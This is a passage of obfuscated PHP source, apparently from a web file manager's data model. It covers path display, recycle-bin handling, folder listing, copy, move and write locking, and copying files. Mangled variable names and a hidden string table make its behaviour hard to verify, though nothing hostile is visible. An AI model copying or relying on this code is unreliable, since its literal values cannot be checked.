$œ¼¥³Œõ[12]; break; } $ñ—©ÄŞ = $ñ—©ÄŞ . rtrim($­ø“—œø[$ÆŞèÆÊ‚[$øäÎçóŞ]], $œ¼¥³Œõ[8]) . $œ¼¥³Œõ[8]; } $ÇõØ‘¡ğ[$œ¼¥³Œõ[413]][$œ¼¥³Œõ[518]] = rtrim($ñ—©ÄŞ, $œ¼¥³Œõ[8]) . $œ¼¥³Œõ[8]; break; } } unset($ÇõØ‘¡ğ); } public function groupPathDisplay(&$ÕÛïÎ¡ó) { $ ó”òî« =& $_SERVER[ĞÂ¤àÓï]; if ($ÕÛïÎ¡ó[$ ó”òî«[411]] != self::TYPE_GROUP) { return; } $„ÒŒºà = Model($ ó”òî«[522])->getInfo($ÕÛïÎ¡ó[$ ó”òî«[505]]); $ïæòçŒ = $this->parentLevelArray($„ÒŒºà[$ ó”òî«[521]]); $ºÂ¹äèÜ = $ ó”òî«[12]; foreach ($ïæòçŒ as $ƒÈè˜Ø²) { $¾¨Åò¹Ø = Model($ ó”òî«[522])->getInfo($ƒÈè˜Ø²); $ºÂ¹äèÜ .= $¾¨Åò¹Ø[$ ó”òî«[86]][$ ó”òî«[402]] . $ ó”òî«[50]; } $ÕÛïÎ¡ó[$ ó”òî«[523]] = $„ÒŒºà[$ ó”òî«[432]]; $ÕÛïÎ¡ó[$ ó”òî«[524]] = $„ÒŒºà[$ ó”òî«[521]]; $ÕÛïÎ¡ó[$ ó”òî«[525]] = $„ÒŒºà[$ ó”òî«[526]]; $ÕÛïÎ¡ó[$ ó”òî«[527]] = $ºÂ¹äèÜ . $„ÒŒºà[$ ó”òî«[86]][$ ó”òî«[402]]; } protected function _listAppendPath(&$³´®ü§, $ĞƒêÑî = false) { $¡î‘‹ â =& $_SERVER[ĞÂ¤àÓï]; static $¢áÊ†Í  = array(); $Ÿ¶è¬ğï = array(); $ï˜º—÷¥ = array(); if ($ĞƒêÑî) { return $¢áÊ†Í ; } foreach ($³´®ü§ as &$Œá×‘¥) { $Ù†ÃÓ¬Ê = $Œá×‘¥[$¡î‘‹ â[402]]; if ($Œá×‘¥[$¡î‘‹ â[410]] == $¡î‘‹ â[88] && $Œá×‘¥[$¡î‘‹ â[432]] != 0) { $¢áÊ†Í [$Ù†ÃÓ¬Ê] = $Œá×‘¥[$¡î‘‹ â[32]]; } if ($Œá×‘¥[$¡î‘‹ â[410]] == $¡î‘‹ â[88] && $Œá×‘¥[$¡î‘‹ â[432]] == 0 && !isset($¢áÊ†Í [$Ù†ÃÓ¬Ê])) { $¢áÊ†Í [$Ù†ÃÓ¬Ê] = $this->_listAppendPathRoot($Œá×‘¥, array()); } if (isset($ï˜º—÷¥[$Œá×‘¥[$¡î‘‹ â[521]]])) { continue; } $ï˜º—÷¥[$Œá×‘¥[$¡î‘‹ â[521]]] = !0; $Äı Ë¨› = $this->parentLevelArray($Œá×‘¥[$¡î‘‹ â[521]]); foreach ($Äı Ë¨› as $¤©µë’• => $¤¢¨¼Âö) { if (isset($¢áÊ†Í [$¤¢¨¼Âö])) { continue; } if ($¤©µë’• == 0) { $¢áÊ†Í [$¤¢¨¼Âö] = $this->_listAppendPathRoot($Œá×‘¥, $Äı Ë¨›); } if ($¤©µë’• != 0) { $Ÿ¶è¬ğï[] = $¤¢¨¼Âö; } } } unset($Œá×‘¥); $Ÿ¶è¬ğï = array_unique($Ÿ¶è¬ğï); if (count($Ÿ¶è¬ğï) > 0) { $¾Ë˜äìš = array($¡î‘‹ â[417] => array($¡î‘‹ â[418], $Ÿ¶è¬ğï)); if (count($Ÿ¶è¬ğï) == 1) { $”¡òœš = $this->sourceInfo($Ÿ¶è¬ğï[0]); $Ì½èƒ©ğ = is_array($”¡òœš) ? array($”¡òœš) : !1; } else { $Ì½èƒ©ğ = $this->field($¡î‘‹ â[528])->where($¾Ë˜äìš)->select(); } if (!$Ì½èƒ©ğ) { $Ì½èƒ©ğ = array(); } foreach ($Ì½èƒ©ğ as $å×Ğş“ë) { $¢áÊ†Í [$å×Ğş“ë[$¡î‘‹ â[402]]] = $å×Ğş“ë[$¡î‘‹ â[32]]; } } $ÌÇÌŠî¯ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $“ÙüĞ˜‡ = array(); foreach ($³´®ü§ as &$Œá×‘¥) { $­ùÜÇä„ = $Œá×‘¥[$¡î‘‹ â[521]]; $¾¤„½ˆ¬ = $¡î‘‹ â[12]; if (isset($“ÙüĞ˜‡[$­ùÜÇä„])) { $¾¤„½ˆ¬ = $“ÙüĞ˜‡[$­ùÜÇä„]; } else { $Äı Ë¨› = $this->parentLevelArray($Œá×‘¥[$¡î‘‹ â[521]]); foreach ($Äı Ë¨› as $¤©µë’• => $¤¢¨¼Âö) { if (isset($¢áÊ†Í [$¤¢¨¼Âö])) { $¾¤„½ˆ¬ .= $¢áÊ†Í [$¤¢¨¼Âö] . $¡î‘‹ â[8]; } } $“ÙüĞ˜‡[$­ùÜÇä„] = $¾¤„½ˆ¬; } $¾¤„½ˆ¬ .= $Œá×‘¥[$¡î‘‹ â[32]]; if ($Œá×‘¥[$¡î‘‹ â[410]] == $¡î‘‹ â[88]) { $¾¤„½ˆ¬ .= $¡î‘‹ â[8]; } $Œá×‘¥[$¡î‘‹ â[519]] = str_replace($¡î‘‹ â[529], $¡î‘‹ â[8], $¾¤„½ˆ¬); if ($Œá×‘¥[$¡î‘‹ â[432]] == $¡î‘‹ â[197]) { $Œá×‘¥[$¡î‘‹ â[32]] = trim($¢áÊ†Í [$Œá×‘¥[$¡î‘‹ â[402]]], $¡î‘‹ â[8]); $Œá×‘¥[$¡î‘‹ â[519]] = $Œá×‘¥[$¡î‘‹ â[32]] . $¡î‘‹ â[8]; } if (intval($Œá×‘¥[$¡î‘‹ â[411]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($Œá×‘¥, $Äı Ë¨›, $ÌÇÌŠî¯); } } unset($Œá×‘¥); return $³´®ü§; } private function _listAppendPathRecycle(&$Ë‚¸Œê, $»‡‡¢Ò, $îı¹¬ğà) { $¿ÕÉ†öõ =& $_SERVER[ĞÂ¤àÓï]; if (!in_array($îı¹¬ğà, $»‡‡¢Ò) && $Ë‚¸Œê[$¿ÕÉ†öõ[402]] != $îı¹¬ğà) { return; } $‘¾æ¶ƒ¨ = explode($¿ÕÉ†öõ[8], trim($Ë‚¸Œê[$¿ÕÉ†öõ[519]], $¿ÕÉ†öõ[8])); $²ÔÒ£üÄ = implode($¿ÕÉ†öõ[8], array_slice($‘¾æ¶ƒ¨, 2)); $Ë‚¸Œê[$¿ÕÉ†öõ[519]] = $¿ÕÉ†öõ[8] . LNG($¿ÕÉ†öõ[530]) . $¿ÕÉ†öõ[8] . ltrim($²ÔÒ£üÄ, $¿ÕÉ†öõ[8]); $Ë‚¸Œê[$¿ÕÉ†öõ[521]] = $¿ÕÉ†öõ[531] . implode($¿ÕÉ†öõ[50], array_slice($»‡‡¢Ò, 1)) . $¿ÕÉ†öõ[50]; if ($Ë‚¸Œê[$¿ÕÉ†öõ[402]] == $îı¹¬ğà) { $Ë‚¸Œê[$¿ÕÉ†öõ[521]] = $¿ÕÉ†öõ[531]; $Ë‚¸Œê[$¿ÕÉ†öõ[432]] = $¿ÕÉ†öõ[197]; $Ë‚¸Œê[$¿ÕÉ†öõ[32]] = LNG($¿ÕÉ†öõ[530]); } $Ë‚¸Œê[$¿ÕÉ†öõ[532]] = $¿ÕÉ†öõ[533]; } protected function _listAppendPathRoot(&$´Ôû†£¬, $ÖìÄâ ¥) { $Ş›ÄÅĞö =& $_SERVER[ĞÂ¤àÓï]; static $ªÆÍ¨«† = false; $¦¨ÇøÛô = $Ş›ÄÅĞö[12]; if ($´Ôû†£¬[$Ş›ÄÅĞö[411]] == self::TYPE_USER) { if (defined($Ş›ÄÅĞö[475]) && $´Ôû†£¬[$Ş›ÄÅĞö[505]] == USER_ID) { $¦¨ÇøÛô = LNG($Ş›ÄÅĞö[534]); if ($ªÆÍ¨«† === !1) { $ÜÓ›—à³ = Model($Ş›ÄÅĞö[535])->getInfoFull(USER_ID); $ªÆÍ¨«† = _get($ÜÓ›—à³, $Ş›ÄÅĞö[536], $Ş›ÄÅĞö[12]); } if ($ÖìÄâ ¥ && $ÖìÄâ ¥[0] == $ªÆÍ¨«† || !$ÖìÄâ ¥ && $´Ôû†£¬[$Ş›ÄÅĞö[402]] == $ªÆÍ¨«†) { $¦¨ÇøÛô = LNG($Ş›ÄÅĞö[537]); $´Ôû†£¬[$Ş›ÄÅĞö[538]] = $Ş›ÄÅĞö[539]; } if (!$ÖìÄâ ¥) { $´Ôû†£¬[$Ş›ÄÅĞö[32]] = $¦¨ÇøÛô; } } else { $†„öúêö = Model($Ş›ÄÅĞö[513])->getInfoSimple($´Ôû†£¬[$Ş›ÄÅĞö[505]]); $¦¨ÇøÛô = LNG($Ş›ÄÅĞö[540]) . $Ş›ÄÅĞö[162] . $†„öúêö[$Ş›ÄÅĞö[32]] . $Ş›ÄÅĞö[164]; $´Ôû†£¬[$Ş›ÄÅĞö[541]] = array($Ş›ÄÅĞö[32] => $†„öúêö[$Ş›ÄÅĞö[32]], $Ş›ÄÅĞö[542] => $†„öúêö[$Ş›ÄÅĞö[542]], $Ş›ÄÅĞö[543] => $†„öúêö[$Ş›ÄÅĞö[543]]); } } else { if ($´Ôû†£¬[$Ş›ÄÅĞö[411]] == self::TYPE_GROUP) { $†„öúêö = Model($Ş›ÄÅĞö[522])->getInfoSimple($´Ôû†£¬[$Ş›ÄÅĞö[505]]); $¦¨ÇøÛô = $†„öúêö[$Ş›ÄÅĞö[32]]; } else { if ($´Ôû†£¬[$Ş›ÄÅĞö[411]] == self::TYPE_SYSTEM) { $¦¨ÇøÛô = $Ş›ÄÅĞö[544]; } } } $¦¨ÇøÛô = $¦¨ÇøÛô ? $Ş›ÄÅĞö[8] . $¦¨ÇøÛô . $Ş›ÄÅĞö[8] : $Ş›ÄÅĞö[8]; return $¦¨ÇøÛô; } protected function _listAppendUser(&$¼ƒÉÍÛ”) { $÷Áªà’í =& $_SERVER[ĞÂ¤àÓï]; $À¸¼˜•© = array_to_keyvalue($¼ƒÉÍÛ”, $÷Áªà’í[12], $÷Áªà’í[454]); $°ÃÈà° = array_to_keyvalue($¼ƒÉÍÛ”, $÷Áªà’í[12], $÷Áªà’í[456]); $ÓÊ¤á©  = array_merge($À¸¼˜•©, $°ÃÈà°); $•’·Ñ¶ˆ = Model($÷Áªà’í[535])->userListInfo($ÓÊ¤á© ); foreach ($¼ƒÉÍÛ” as &$œƒÊøÃ) { $Á¦¸æ‘ = $œƒÊøÃ[$÷Áªà’í[454]]; $œƒÊøÃ[$÷Áªà’í[454]] = $•’·Ñ¶ˆ[$Á¦¸æ‘] ? $•’·Ñ¶ˆ[$Á¦¸æ‘] : !1; $Á¦¸æ‘ = $œƒÊøÃ[$÷Áªà’í[456]]; $œƒÊøÃ[$÷Áªà’í[456]] = $•’·Ñ¶ˆ[$Á¦¸æ‘] ? $•’·Ñ¶ˆ[$Á¦¸æ‘] : !1; if (isset($œƒÊøÃ[$÷Áªà’í[466]]) && $œƒÊøÃ[$÷Áªà’í[466]][$÷Áªà’í[545]]) { $ìÙ•û¯ = $GLOBALS[$÷Áªà’í[6]][$÷Áªà’í[89]][$÷Áªà’í[546]]; if ($œƒÊøÃ[$÷Áªà’í[466]][$÷Áªà’í[547]] <= time() - $ìÙ•û¯) { $this->metaSet($œƒÊøÃ[$÷Áªà’í[402]], $÷Áªà’í[545], null); $this->metaSet($œƒÊøÃ[$÷Áªà’í[402]], $÷Áªà’í[547], null); unset($œƒÊøÃ[$÷Áªà’í[466]][$÷Áªà’í[545]]); continue; } $¤Îº£¤À = $œƒÊøÃ[$÷Áªà’í[466]][$÷Áªà’í[545]]; $œƒÊøÃ[$÷Áªà’í[466]][$÷Áªà’í[548]] = Model($÷Áªà’í[535])->getInfoSimpleOuter($¤Îº£¤À); } } unset($œƒÊøÃ); } public function parentLevelArray($£Ÿñµ) { $«¬í èì =& $_SERVER[ĞÂ¤àÓï]; $£Ÿñµ = explode($«¬í èì[50], trim($£Ÿñµ, $«¬í èì[50])); return array_remove_value($£Ÿñµ, $«¬í èì[197]); } public function listAll($Ø±©­ ±) { $èÃÇò¥ =& $_SERVER[ĞÂ¤àÓï]; $å·À™ºò = $this->sourceInfo($Ø±©­ ±); $ñ“„°ã£ = array($èÃÇò¥[549] => array($èÃÇò¥[550], $å·À™ºò[$èÃÇò¥[521]] . $Ø±©­ ± . $èÃÇò¥[551]), $èÃÇò¥[552] => 0); $¬’ß€•Ï = $èÃÇò¥[553]; $Ş³× „ = "\x4c\x45\x46\124\x20\112\x4f\111\x4e\40{$this->tablePrefix}\x69\x6f\137\x66\151\154\x65\40\x66\151\154\145\40\x6f\x6e\40\163\157\165\162\x63\145\56\x66\x69\x6c\145\111\104\x20\75\x20\x66\x69\x6c\x65\56\146\x69\x6c\x65\111\104"; $™¬ÕÏ³Ö = $this->alias($èÃÇò¥[446])->field($¬’ß€•Ï)->where($ñ“„°ã£)->join($Ş³× „)->select(); $this->_listAppendAuth($™¬ÕÏ³Ö); $this->_listAppendUser($™¬ÕÏ³Ö); $this->_listAppendPath($™¬ÕÏ³Ö); $™¬ÕÏ³Ö = array_to_keyvalue($™¬ÕÏ³Ö, $èÃÇò¥[402]); $ÊÀ«¤€š = "\57{$å·À™ºò[$èÃÇò¥[32]]}\x2f"; $ÊÀ«¤€š = $ÊÀ«¤€š == $èÃÇò¥[529] ? $èÃÇò¥[8] : $ÊÀ«¤€š; $µ ß»…ç = array(); foreach ($™¬ÕÏ³Ö as $²ÀÏ¹ºè => $¹Ô…Ú×ƒ) { $””÷´ñÊ = $this->parentLevelArray($¹Ô…Ú×ƒ[$èÃÇò¥[521]]); array_shift($””÷´ñÊ); $×¨ˆùÅæ = $ÊÀ«¤€š; for ($æ‰ ²÷– = 0; $æ‰ ²÷– < count($””÷´ñÊ); $æ‰ ²÷–++) { $×¨ˆùÅæ .= $™¬ÕÏ³Ö[$””÷´ñÊ[$æ‰ ²÷–]][$èÃÇò¥[32]] . $èÃÇò¥[8]; } $×¨ˆùÅæ .= $¹Ô…Ú×ƒ[$èÃÇò¥[32]]; if ($¹Ô…Ú×ƒ[$èÃÇò¥[410]]) { $×¨ˆùÅæ .= $èÃÇò¥[8]; } $×¨ˆùÅæ = str_replace($èÃÇò¥[529], $èÃÇò¥[8], $×¨ˆùÅæ); $×¨ˆùÅæ = str_replace($èÃÇò¥[529], $èÃÇò¥[8], $×¨ˆùÅæ); $ĞÙëØ‹à = array($èÃÇò¥[421] => str_replace($èÃÇò¥[529], $èÃÇò¥[8], $×¨ˆùÅæ), $èÃÇò¥[554] => intval($¹Ô…Ú×ƒ[$èÃÇò¥[410]]), $èÃÇò¥[86] => $this->pathInfoFilter($¹Ô…Ú×ƒ)); if (!$¹Ô…Ú×ƒ[$èÃÇò¥[410]]) { $ĞÙëØ‹à[$èÃÇò¥[468]] = $¹Ô…Ú×ƒ[$èÃÇò¥[468]]; $ĞÙëØ‹à[$èÃÇò¥[87]] = $¹Ô…Ú×ƒ[$èÃÇò¥[84]]; } $µ ß»…ç[] = $ĞÙëØ‹à; } return $µ ß»…ç; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ë÷ùî›Š) { $Ş¤¾œ®‹ =& $_SERVER[ĞÂ¤àÓï]; if (!$this->allowLock()) { return; } $this->_lockCheck($Ş¤¾œ®‹[555], $ë÷ùî›Š); $«êœŞ‘¿ = 1; $this->_lockEvent($ë÷ùî›Š, array($Ş¤¾œ®‹[556], $Ş¤¾œ®‹[557]), $«êœŞ‘¿); $this->_lockParent($ë÷ùî›Š, array($Ş¤¾œ®‹[557]), $«êœŞ‘¿); $this->_lockEvent($ë÷ùî›Š, array($Ş¤¾œ®‹[558], $Ş¤¾œ®‹[559]), $«êœŞ‘¿); $this->_lockCheckEnd($Ş¤¾œ®‹[555], $ë÷ùî›Š); } public function lockCopyEnd($ßÙÄ¹ş) { $§Š»™§ù =& $_SERVER[ĞÂ¤àÓï]; if (!$this->allowLock()) { return; } $ñ€âÅ²„ = 0; $this->_lockEvent($ßÙÄ¹ş, array($§Š»™§ù[556], $§Š»™§ù[557]), $ñ€âÅ²„); $this->_lockParent($ßÙÄ¹ş, array($§Š»™§ù[557]), $ñ€âÅ²„); $this->_lockEvent($ßÙÄ¹ş, array($§Š»™§ù[558], $§Š»™§ù[559]), $ñ€âÅ²„); } public function lockWriteStart($¥²å¿æü, $‹Å•Éµì = '') { $™ˆ¾Òœø =& $_SERVER[ĞÂ¤àÓï]; if (!$this->allowLock()) { return; } $this->_lockCheck($™ˆ¾Òœø[556], $¥²å¿æü); $§—“ÒÅ€ = 1; $this->_lockKey($™ˆ¾Òœø[560] . $¥²å¿æü . $™ˆ¾Òœø[10] . $‹Å•Éµì, $§—“ÒÅ€); $this->_lockEvent($¥²å¿æü, array($™ˆ¾Òœø[555], $™ˆ¾Òœø[557]), $§—“ÒÅ€); $this->_lockParent($¥²å¿æü, array($™ˆ¾Òœø[555], $™ˆ¾Òœø[557]), $§—“ÒÅ€); $this->_lockCheckEnd($™ˆ¾Òœø[556], $¥²å¿æü); } public function lockWriteEnd($ØüÅ®Åó, $øç‚…Œº = '') { $ï—Ã©Õö =& $_SERVER[ĞÂ¤àÓï]; if (!$this->allowLock()) { return; } $“Ô‡²… = 0; $this->_lockKey($ï—Ã©Õö[560] . $ØüÅ®Åó . $ï—Ã©Õö[10] . $øç‚…Œº, $“Ô‡²…); $this->_lockEvent($ØüÅ®Åó, array($ï—Ã©Õö[555], $ï—Ã©Õö[557]), $“Ô‡²…); $this->_lockParent($ØüÅ®Åó, array($ï—Ã©Õö[555], $ï—Ã©Õö[557]), $“Ô‡²…); } public function lockMoveStart($Ÿö¾›˜¬) { $ç¬ÁÀ¹‡ =& $_SERVER[ĞÂ¤àÓï]; if (!$this->allowLock()) { return; } $this->_lockCheck($ç¬ÁÀ¹‡[557], $Ÿö¾›˜¬); $ÆñøÄÓÌ = 1; $this->_lockKey($ç¬ÁÀ¹‡[561] . $Ÿö¾›˜¬, $ÆñøÄÓÌ); $this->_lockEvent($Ÿö¾›˜¬, array($ç¬ÁÀ¹‡[555], $ç¬ÁÀ¹‡[556]), $ÆñøÄÓÌ); $this->_lockParent($Ÿö¾›˜¬, array($ç¬ÁÀ¹‡[555], $ç¬ÁÀ¹‡[557]), $ÆñøÄÓÌ); $this->_lockEvent($Ÿö¾›˜¬, array($ç¬ÁÀ¹‡[562], $ç¬ÁÀ¹‡[558], $ç¬ÁÀ¹‡[559]), $ÆñøÄÓÌ); $this->_lockCheckEnd($ç¬ÁÀ¹‡[557], $Ÿö¾›˜¬); } public function lockMoveEnd($ºß¼×å‰) { $œ‘„½ù® =& $_SERVER[ĞÂ¤àÓï]; if (!$this->allowLock()) { return; } $ìË–ğ¯ = 0; $this->_lockKey($œ‘„½ù®[561] . $ºß¼×å‰, $ìË–ğ¯); $this->_lockEvent($ºß¼×å‰, array($œ‘„½ù®[555], $œ‘„½ù®[556]), $ìË–ğ¯); $this->_lockParent($ºß¼×å‰, array($œ‘„½ù®[555], $œ‘„½ù®[557]), $ìË–ğ¯); $this->_lockEvent($ºß¼×å‰, array($œ‘„½ù®[562], $œ‘„½ù®[558], $œ‘„½ù®[559]), $ìË–ğ¯); } private function _lockCheck($ÑÂûğË, $ë¥ò²âÊ) { $äª‚˜¾ =& $_SERVER[ĞÂ¤àÓï]; $á×øêù = $this->sourceInfo($ë¥ò²âÊ); $®‡îıø· = $ÑÂûğË . $äª‚˜¾[10] . $ë¥ò²âÊ; $this->_lockTimeStart[$®‡îıø·] = timeFloat(); if (!is_array($á×øêù)) { return; } $Å©ƒ¿ª = LNG($äª‚˜¾[563]); CacheLock::setErrorMsg($äª‚˜¾[162] . htmlspecialchars($á×øêù[$äª‚˜¾[32]]) . $äª‚˜¾[164] . $Å©ƒ¿ª); $this->_lockKey($®‡îıø·, 1); $this->_lockKey($®‡îıø·, 0); $Şìù¿· = array_reverse($this->parentLevelArray($á×øêù[$äª‚˜¾[521]])); foreach ($Şìù¿· as $çúú¿şø) { $®‡îıø· = $ÑÂûğË . $äª‚˜¾[564] . $çúú¿şø; if (CacheLock::lockGet($äª‚˜¾[565] . $®‡îıø·)) { $á×øêù = $this->sourceInfo($çúú¿şø); CacheLock::setErrorMsg($äª‚˜¾[162] . htmlspecialchars($á×øêù[$äª‚˜¾[32]]) . $äª‚˜¾[164] . $Å©ƒ¿ª); $this->_lockKey($®‡îıø·, 1); $this->_lockKey($®‡îıø·, 0); } } } private function _lockCheckEnd($àá¶ÖÈ¯, $é˜İ¡¨) { $Ğ«™šç =& $_SERVER[ĞÂ¤àÓï]; $™Ûîò©ì = $àá¶ÖÈ¯ . $Ğ«™šç[10] . $é˜İ¡¨; CacheLock::setErrorMsg($Ğ«™šç[378]); if (!isset($this->_lockTimeStart[$™Ûîò©ì])) { return; } $¾†çÖ©Á = timeFloat() - $this->_lockTimeStart[$™Ûîò©ì]; unset($this->_lockTimeStart[$™Ûîò©ì]); if ($¾†çÖ©Á > 0.5) { unset(self::$cacheSourceInfo[$Ğ«™šç[460] . $é˜İ¡¨]); } $ˆ¹÷à‡ = $this->sourceInfo($é˜İ¡¨); if (!$ˆ¹÷à‡) { show_json(LNG($Ğ«™šç[105]), !1); } } private function _lockParent($ŸŒÊú”Ü, $ßŠØØä¯, $½äÛ™éú) { if (!$this->autoLockSet) { return; } $Ûßìûİœ = $this->sourceInfo($ŸŒÊú”Ü); if (!is_array($Ûßìûİœ)) { return; } $Ş¢ÉÀ¡ = array_reverse($this->parentLevelArray($Ûßìûİœ[$_SERVER[ĞÂ¤àÓï][521]])); foreach ($Ş¢ÉÀ¡ as $¡àú·) { $this->_lockEvent($¡àú·, $ßŠØØä¯, $½äÛ™éú); } } private function _lockEvent($éîè¿ºò, $Â€×â¼õ, $¼½Åá½ü) { $ şØğ¤ =& $_SERVER[ĞÂ¤àÓï]; if (!$this->autoLockSet) { return; } foreach ($Â€×â¼õ as $†»ÓÓåì) { $ùó¯ÛÂò = $†»ÓÓåì . $ şØğ¤[10] . $éîè¿ºò; if ($¼½Åá½ü && CacheLock::lockGet($ şØğ¤[565] . $ùó¯ÛÂò)) { continue; } $this->_lockKey($ùó¯ÛÂò, $¼½Åá½ü); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ö¼·ÅäÊ, $ìì—Æ½Ÿ = 1) { $êØˆ´œá = $_SERVER[ĞÂ¤àÓï][565] . md5($ö¼·ÅäÊ); if ($ìì—Æ½Ÿ) { if (isset(self::$_lockItemArr[$êØˆ´œá])) { return; } self::$_lockItemArr[$êØˆ´œá] = 1; CacheLock::lock($êØˆ´œá, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$êØˆ´œá])) { return; } unset(self::$_lockItemArr[$êØˆ´œá]); CacheLock::unlock($êØˆ´œá); } } public function isParentOf($öÁ„÷ª», $ãÎŠ®Ã“) { $†–‡÷¯… =& $_SERVER[ĞÂ¤àÓï]; $¯©‹ìıµ = $this->sourceInfo($öÁ„÷ª»); $¥Œ”ŞÈ = $this->sourceInfo($ãÎŠ®Ã“); $‡â ÚÆ˜ = $¯©‹ìıµ[$†–‡÷¯…[521]] . $¯©‹ìıµ[$†–‡÷¯…[402]] . $†–‡÷¯…[50]; $Ş„îÏ = $¥Œ”ŞÈ[$†–‡÷¯…[521]] . $¥Œ”ŞÈ[$†–‡÷¯…[402]] . $†–‡÷¯…[50]; $õ£°ó³ö = strpos($Ş„îÏ, $‡â ÚÆ˜) === 0; return $õ£°ó³ö; } private $targetIsDelete = 0; public function copy($çŞº°Ÿ, $ïë”Š·€, $¼Â§Ü° = REPEAT_REPLACE, $ï˜ê„í¶ = '') { $©º÷ñó =& $_SERVER[ĞÂ¤àÓï]; $ñÅ¢³ğ = $this->sourceInfo($çŞº°Ÿ); $ıÚ“¤® = $this->sourceInfo($ïë”Š·€); if (!$ñÅ¢³ğ || !$ıÚ“¤® || $ıÚ“¤®[$©º÷ñó[410]] != $©º÷ñó[88]) { return !1; } if ($this->isParentOf($çŞº°Ÿ, $ïë”Š·€)) { return !1; } $ÛÍæŠ¶ó = $ï˜ê„í¶ ? $ï˜ê„í¶ : $ñÅ¢³ğ[$©º÷ñó[32]]; $this->lockCopyStart($çŞº°Ÿ); $this->lockWriteStart($ïë”Š·€, $ÛÍæŠ¶ó); $ø‰Äôš = array($©º÷ñó[566] => array(), $©º÷ñó[567] => array(), $©º÷ñó[568] => array()); $this->targetIsDelete = intval($ñÅ¢³ğ[$©º÷ñó[431]]); $È¬‡ÖöĞ = $this->fileNameExistCache($ïë”Š·€, $ñÅ¢³ğ[$©º÷ñó[32]]); $ùşòó¼ß = $this->_copy($çŞº°Ÿ, $ïë”Š·€, $¼Â§Ü°, $ø‰Äôš, !0, $ï˜ê„í¶); $this->_childrenListClear(); $this->lockCopyEnd($çŞº°Ÿ); $this->lockWriteEnd($ïë”Š·€, $ÛÍæŠ¶ó); if ($ñÅ¢³ğ[$©º÷ñó[410]] == $©º÷ñó[88] && $È¬‡ÖöĞ == $ùşòó¼ß) { $this->folderSizeResetChildren($È¬‡ÖöĞ); } Model($©º÷ñó[569])->addAll($ø‰Äôš[$©º÷ñó[567]], array(), !0); if ($È¬‡ÖöĞ != $ùşòó¼ß || $ñÅ¢³ğ[$©º÷ñó[410]] == $©º÷ñó[88]) { Model($©º÷ñó[570])->eventCopy($ùşòó¼ß); } $this->saveAll($ø‰Äôš[$©º÷ñó[568]]); Model($©º÷ñó[199])->linkAdd($ø‰Äôš[$©º÷ñó[566]]); $this->folderSizeReset($ïë”Š·€); $this->updateModifyTime($ïë”Š·€); return $ùşòó¼ß; } private function _copy($Åáé…÷¨, $çš…íùæ, $¥àŒÛî®, &$³õ¹ôü, $¥²»ÔõÕ, $Ö¬—‰¢ = '') { $óŠ•ÄÏ =& $_SERVER[ĞÂ¤àÓï]; $Œºï·– = $this->sourceInfoCache($Åáé…÷¨); $äÀñ–¢ç = $Œºï·–[$óŠ•ÄÏ[410]] == $óŠ•ÄÏ[88]; $û€É®¬Ô = $Ö¬—‰¢ ? $Ö¬—‰¢ : $Œºï·–[$óŠ•ÄÏ[32]]; $Ø›ùøÀƒ = $this->fileNameExistCache($çš…íùæ, $û€É®¬Ô); if ($¥²»ÔõÕ) { $this->_childrenAllMake($Åáé…÷¨); if ($äÀñ–¢ç && $Ø›ùøÀƒ) { $this->_childrenAllMake($Ø›ùøÀƒ); } } if (!$Ø›ùøÀƒ) { return $this->_copyCreate($Åáé…÷¨, $çš…íùæ, $û€É®¬Ô, $³õ¹ôü); } $‡Ÿù«¹ = $Ø›ùøÀƒ; if ($äÀñ–¢ç) { if ($¥àŒÛî® == REPEAT_RENAME_FOLDER) { $û€É®¬Ô = $this->fileNameAutoCache($çš…íùæ, $û€É®¬Ô, $¥àŒÛî®, $äÀñ–¢ç); $‡Ÿù«¹ = $this->_copyCreate($Åáé…÷¨, $çš…íùæ, $û€É®¬Ô, $³õ¹ôü); } else { $óŞŸÂ = $this->_childrenList($Åáé…÷¨); foreach ($óŞŸÂ as $°’¾Ó) { $this->_copy($°’¾Ó[$óŠ•ÄÏ[402]], $Ø›ùøÀƒ, $¥àŒÛî®, $³õ¹ôü, !1); } } } else { if ($¥àŒÛî® == REPEAT_RENAME || $¥àŒÛî® == REPEAT_RENAME_FOLDER) { $û€É®¬Ô = $this->fileNameAutoCache($çš…íùæ, $û€É®¬Ô, $¥àŒÛî®, $äÀñ–¢ç); $‡Ÿù«¹ = $this->_copyCreate($Åáé…÷¨, $çš…íùæ, $û€É®¬Ô, $³õ¹ôü); } else { if ($¥àŒÛî® == REPEAT_REPLACE) { $ªÁïäìÔ = $this->sourceInfoCache($Ø›ùøÀƒ); $§íğíÄ› = $this->fileHistory($ªÁïäìÔ, $Œºï·–[$óŠ•ÄÏ[468]], $Œºï·–[$óŠ•ÄÏ[76]]); if ($§íğíÄ›) { $³õ¹ôü[$óŠ•ÄÏ[566]][] = $Œºï·–[$óŠ•ÄÏ[468]]; } } else { if ($¥àŒÛî® == REPEAT_SKIP) { } } } Hook::trigger($óŠ•ÄÏ[571], array($óŠ•ÄÏ[572], $Œºï·–, 0)); } return $‡Ÿù«¹; } private function _copyCreate($ÌÁ°ÍÛà, $…•»—’, $Û¿ÍŞù­, &$¹åÁ¶¼Ç) { $„Ä…ğ´Ù =& $_SERVER[ĞÂ¤àÓï]; $øÂœé™ñ = $this->sourceInfoCache($ÌÁ°ÍÛà); $Óßñ‹éı = $this->sourceInfoCache($…•»—’); $©™¡îŒ = $this->_makeItemData($øÂœé™ñ, $Óßñ‹éı, $Û¿ÍŞù­); Hook::trigger($„Ä…ğ´Ù[573], $©™¡îŒ); Hook::trigger($„Ä…ğ´Ù[574], array($„Ä…ğ´Ù[575], $©™¡îŒ, 0)); $ÎÄÃêïƒ = $this->add($©™¡îŒ); $¡çŒŞ = array($„Ä…ğ´Ù[402] => $ÎÄÃêïƒ, $„Ä…ğ´Ù[32] => $Û¿ÍŞù­); $this->_copyApplyMeta($¡çŒŞ, $¹åÁ¶¼Ç); if ($øÂœé™ñ[$„Ä…ğ´Ù[410]] != $„Ä…ğ´Ù[88]) { $¹åÁ¶¼Ç[$„Ä…ğ´Ù[566]][] = $øÂœé™ñ[$„Ä…ğ´Ù[468]]; return $ÎÄÃêïƒ; } $””§¹±‚ = array(); $Ö“¦ÂÓ = array(); $this->_childrenListAll($ÌÁ°ÍÛà, $””§¹±‚); 